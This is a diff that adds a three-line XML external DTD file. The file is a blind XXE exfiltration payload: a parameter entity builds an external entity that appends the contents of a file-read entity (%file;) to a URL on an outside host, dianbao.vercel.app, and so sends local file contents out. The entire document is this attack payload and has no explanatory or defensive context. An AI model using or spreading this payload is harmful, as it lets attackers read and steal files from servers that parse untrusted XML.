@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://dianbao.vercel.app/send/3AD2781AD6E69/?%file;'>">
+%all;
